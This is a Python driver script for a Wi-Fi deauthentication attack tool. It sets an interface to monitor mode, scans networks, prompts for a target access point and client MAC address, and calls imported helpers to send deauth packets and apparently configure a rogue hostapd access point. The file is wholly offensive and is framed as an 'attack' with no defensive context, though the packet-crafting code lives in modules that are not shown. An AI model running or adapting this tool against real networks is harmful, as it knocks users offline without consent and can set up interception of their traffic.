#!/usr/bin/env python
import os
import sys
from scapy.all import get_if_list
import logging

import fileinput
import signal
from sys import platform
import threading
import argparse
from multiprocessing import Process

# import functions
from configs.config import setMonitorMode, updateHostAP, setManagerMode
from scanning.sniffing import sniffClients, scanNetworks
from spoofing.spoofing import setTarget

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def attack():

    print(f"list of available interfaces:\n{get_if_list()}")

    interface = wlan = input("\nEnter full interface name to set to Monitor Mode: \n "
                             "(The full address can be found via the terminal... run command 'pwconfig' and find the desired device) \n \n ")

    setMonitorMode(wlan)

    # print("\nIn order to change back card into regular wifi-mode run the following command after you are done: \n"
    #       "service NetworkManager restart\n")

    try:
        known = scanNetworks(interface)

    except KeyboardInterrupt:
        print("Press Ctrl-C to finish scanning for networks")
        pass

    print("Dauth stage: ")
    # Let the user input the MAC address of the router
    BSSID = input('Please enter the BSSID/MAC address of the AP: ')

    print('Changing ' + wlan + ' to channel ' + str(known[BSSID][1]))
    os.system("iwconfig %s channel %d" % (wlan, known[BSSID][1]))

    updateHostAP(known, BSSID)

    sniffClients(wlan, BSSID)

    brdMac = input(
        'Please enter the BSSID/MAC address of the client you wish to attack: ')

    print('Sending deauth packets now, press ctrl+c to end the attack')
    print('' * 2)

    setTarget(brdMac, interface, BSSID)

    print("DONE! Reverting monitor card back to managed mode :)")
    setManagerMode(wlan)


if __name__ == "__main__":
    attack()
